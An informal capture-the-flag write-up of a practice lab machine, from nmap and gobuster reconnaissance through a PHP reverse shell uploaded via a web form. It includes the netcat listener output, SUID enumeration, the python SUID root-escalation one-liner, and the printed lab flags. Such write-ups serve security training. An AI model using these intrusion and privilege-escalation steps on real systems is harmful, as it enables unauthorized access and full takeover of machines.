this is the info that we got using nmap 

////////////////////////////

nmap -sC -sV 10.10.129.168
Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-14 00:06 GMT
Nmap scan report for 10.10.129.168
Host is up (0.26s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 4a:b9:16:08:84:c2:54:48:ba:5c:fd:3f:22:5f:22:14 (RSA)
|   256 a9:a6:86:e8:ec:96:c3:f0:03:cd:16:d5:49:73:d0:82 (ECDSA)
|_  256 22:f6:b5:a6:54:d9:78:7c:26:03:5a:95:f3:f9:df:cd (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: HackIT - Home
|_http-server-header: Apache/2.4.29 (Ubuntu)
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 38.37 seconds
                                              

///////////////////////////////////



lets use gobuster to check repositories 

gobuster dir -u http://10.10.129.168 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt


we found an upload repository 

http://10.10.129.168/uploads/ 

lets try to find a way reverse shell on it 

we found an upload forme in this directory http://10.10.129.168/panel/

lets try to create a php reverse shell 

this is a github repository that has a payload 

https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php


after downloading , updating and modifying the shell we got access remotly 

\\\\\\\\\\\\\\\\\

 nc -lnvp 9999
Listening on 0.0.0.0 9999
Connection received on 10.10.225.8 35074
Linux rootme 4.15.0-112-generic #113-Ubuntu SMP Thu Jul 9 23:41:39 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 01:00:03 up 12 min,  0 users,  load average: 0.00, 0.12, 0.17
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off


\\\\\\\\\\\\\\\\\\


now lets try to find the flag user.txt

using :  find / -name user.txt 2>/dev/null


we found it 

//////////

$ find / -name user.txt 2>/dev/null
/var/www/user.txt
$ cat /var/www/user.txt
THM{y0u_g0t_a_sh3ll}
$ 

/////////


now lets Search for files with SUID permission, and find which file is weird?

all using : find / -user root -perm /4000

//////////////////////////////////

find /: Starts searching from the root directory (/), which means it will search the entire file system.
-user root: Searches for files owned by the user root.
-perm /4000: Searches for files with setuid permission (the 4000 value).

    Setuid (4000) means the file, when executed, runs with the permissions of the file owner, in this case, root.
    
    ////////////////////////
    
    
    and so that it doesnt show us the error we redirect to : 2>/dev/null
    
    
    
    the cmnd : find / -user root -perm /4000 2>/dev/null
    
    the wierd file is : /usr/bin/python 
    
    
    now lets find root.txt
    
    the find cmnd didnt work : find / -name root.txt 2>/dev/null
    
    they gave us a hint for the priviliges escalation 
    
    is that we use an suid from this website https://gtfobins.github.io/#+suid and the file  /usr/bin/python was the hint , they want us to use the suid of the python 
    
    in the suid of python we found this , when we run it using the repository we found we will get a privilige escalation to root 
    
bash-4.4$ /usr/bin/python -c 'import os; os.execl("/bin/sh", "sh", "-p")'


# whoami
root


now lets find the last file : 

 find / -name root.txt 2>/dev/null
/root/root.txt


and here is the ctf 
# find / -name root.txt 2>/dev/null
/root/root.txt
# cat /root/root.txt
THM{pr1v1l3g3_3sc4l4t10n}
# 



///////////////

we searched for the suid to get the root files on the system 

SUID stands for Set User ID and is a special file permission in Unix-like operating systems (Linux, macOS, etc.). It is a permission that can be set on executable files, which allows users to execute the file with the permissions of the file's owner rather than the user running it.
What is SUID?

    SUID (Set User ID) allows a program to run with the privileges of the owner of the file, typically the root user, even if the person running the program doesn't have root privileges.
    
    
    then i found that among thos files there is /usr/bin/python 
    
  than i used this website to search for suid for python to make me became root https://gtfobins.github.io/gtfobins/python/#suid 
  
  than runned the command using the file 
  
  /usr/bin/python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
  
  
  than i beacame root 
  
  
    
    




    
    



    
    
    








